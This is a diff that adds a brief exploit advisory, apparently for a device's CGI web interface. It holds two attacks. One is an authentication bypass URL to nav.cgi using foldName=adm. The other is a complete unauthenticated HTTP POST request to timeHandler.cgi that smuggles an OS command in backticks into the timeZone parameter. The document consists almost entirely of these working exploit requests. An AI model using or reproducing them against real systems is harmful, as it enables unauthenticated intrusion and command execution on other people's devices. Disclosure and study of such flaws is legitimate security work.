@@ -1,0 +1,19 @@
+Authentication Bypass: 
+
+http://www.example.com/nav.cgi?foldName=adm&localePreference=en
+
+Unauthenticated OS Command Injection:
+
+Example Exploit:
+POST /cgi/time/timeHandler.cgi HTTP/1.1
+Host: 192.168.178.41
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.41/cgi/time/time.cgi
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 186
+ 
+month=1&date=1&year=2007&hour=12&minute=10&m=PM&timeZone=Amsterdam`COMMAND`&ntp_type=default&ntpServer=none&old_date=+1+12007&old_time=1210&old_timeZone=Amsterdam&renew=0
